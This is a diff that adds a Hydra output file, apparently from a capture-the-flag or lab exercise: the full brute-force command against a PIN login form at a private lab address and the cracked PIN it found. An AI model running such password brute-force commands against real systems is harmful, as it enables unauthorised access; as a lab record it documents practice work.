@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2023-12-04 01:01:27 on 10.10.79.182 http-post-form (hydra -l  -P possible_pins.txt -s 8000 -v -f -o pin.txt 10.10.79.182 http-post-form /login.php:pin=^PASS^:Access denied)
+[8000][http-post-form] host: 10.10.79.182   password: 6F5
